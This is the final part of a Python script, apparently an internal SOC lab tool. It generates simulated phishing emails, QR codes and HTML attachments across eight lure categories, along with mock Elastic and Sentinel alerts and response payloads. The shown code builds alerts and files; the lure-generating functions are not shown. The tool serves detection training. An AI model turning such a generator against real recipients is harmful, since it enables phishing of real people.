            "ArtifactFile": os.path.basename(artifact.get("file","")),
            "SOCSimulation": "true",
            "TestRunDate": datetime.now().strftime("%Y-%m-%d"),
        }),
        "ConfidenceLevel": "High",
    }


def gen_soc_payload(artifact: dict, elastic: dict) -> dict:
    """Normalized SOC/SOAR-compatible alert payload"""
    ioc = artifact.get("ioc", {})
    return {
        "alert_id": elastic.get("kibana.alert.uuid", str(uuid.uuid4())),
        "source_siem": "elastic",
        "timestamp": elastic.get("@timestamp"),
        "severity": elastic.get("kibana.alert.severity"),
        "title": elastic.get("kibana.alert.rule.name"),
        "simulation": True,
        "phishing_category": artifact["type"],
        "email_metadata": {
            "sender": artifact.get("sender"),
            "subject": artifact.get("subject"),
            "eml_file": artifact.get("file"),
        },
        "iocs": ioc,
        "mitre_mapping": {
            "tactic": "Initial Access (TA0001)",
            "technique": ALERT_META.get(artifact["type"], ("","","T1566",""))[2],
        },
        "enrichment_context": {
            "sender_domain_registrar": "new-registrar",
            "sender_domain_age_days": random.randint(1, 30),
            "url_category": "phishing-simulation",
            "url_reputation": "malicious",
            "has_attachment": bool(ioc.get("attachment")),
            "attachment_type": "html" if ioc.get("attachment","").endswith(".html") else "none",
            "spf_pass": False,
            "dkim_pass": False,
            "dmarc_pass": False,
        },
        "recommended_actions": [
            "Quarantine email",
            "Block sender domain",
            "Search mailboxes for similar subjects (last 30 days)",
            "Notify recipient",
            "Add sender domain to threat intelligence feed",
        ],
    }


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

GENERATORS = [
    gen_clickfix,
    gen_credential_harvest,
    gen_quishing,
    gen_html_attachment,
    gen_bec,
    gen_invoice,
    gen_delivery,
    gen_mfa_reset,
]


def main():
    parser = argparse.ArgumentParser(
        description="Phishing Simulation Artifact Generator — Internal SOC Lab")
    parser.add_argument("--output", default=CONFIG["output_dir"])
    parser.add_argument("--count", type=int, default=3,
                        help="Samples per category (default: 3)")
    parser.add_argument("--url", default=CONFIG["test_base_url"],
                        help="Internal test landing URL")
    parser.add_argument("--domain", default=CONFIG["target_domain"],
                        help="Target company email domain")
    args = parser.parse_args()

    CONFIG["output_dir"] = args.output
    CONFIG["test_base_url"] = args.url
    CONFIG["target_domain"] = args.domain

    ensure_dirs(CONFIG["output_dir"])

    if not QR_AVAILABLE:
        print("[WARN] qrcode/Pillow not installed — QR images will be text placeholders.")
        print("       pip install qrcode[pil] Pillow\n")

    print(f"[+] Phishing Artifact Generator — Internal SOC Lab")
    print(f"[+] Output   : {CONFIG['output_dir']}")
    print(f"[+] Test URL : {CONFIG['test_base_url']}")
    print(f"[+] Samples  : {args.count} x {len(GENERATORS)} categories = {args.count*len(GENERATORS)} total\n")

    all_artifacts = []

    for gen_fn in GENERATORS:
        for _ in range(args.count):
            try:
                artifact = gen_fn(CONFIG["output_dir"], CONFIG)
                elastic = gen_elastic_alert(artifact, CONFIG)
                sentinel = gen_sentinel_alert(artifact, CONFIG)
                soc_payload = gen_soc_payload(artifact, elastic)

                base = f"{artifact['type']}_{uuid.uuid4().hex[:8]}"
                save_json(elastic, os.path.join(CONFIG["output_dir"], "siem_alerts/elastic", f"{base}.json"))
                save_json(sentinel, os.path.join(CONFIG["output_dir"], "siem_alerts/sentinel", f"{base}.json"))
                save_json(soc_payload, os.path.join(CONFIG["output_dir"], "soc_payloads", f"{base}.json"))

                all_artifacts.append({**artifact, "alert_id": soc_payload["alert_id"]})
                print(f"  [+] {artifact['type']:<30} {os.path.basename(artifact['file'])}")

            except Exception as e:
                print(f"  [!] Error in {gen_fn.__name__}: {e}")
                import traceback; traceback.print_exc()

    manifest = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "generator_version": "1.0",
        "total_artifacts": len(all_artifacts),
        "categories": sorted({a["type"] for a in all_artifacts}),
        "config": {k: v for k, v in CONFIG.items() if k != "sender_domains"},
        "artifacts": all_artifacts,
    }
    save_json(manifest, os.path.join(CONFIG["output_dir"], "reports", "manifest.json"))

    print(f"\n[+] Done. {len(all_artifacts)} artifacts generated.")
    print(f"    EML files      : {CONFIG['output_dir']}/emails/")
    print(f"    QR codes       : {CONFIG['output_dir']}/qr_codes/")
    print(f"    HTML pages     : {CONFIG['output_dir']}/html_attachments/")
    print(f"    Elastic alerts : {CONFIG['output_dir']}/siem_alerts/elastic/")
    print(f"    Sentinel alerts: {CONFIG['output_dir']}/siem_alerts/sentinel/")
    print(f"    SOC payloads   : {CONFIG['output_dir']}/soc_payloads/")
    print(f"    Manifest       : {CONFIG['output_dir']}/reports/manifest.json")
    print(f"\n[!] All artifacts are benign. For internal SOC use only.")


if __name__ == "__main__":
    main()
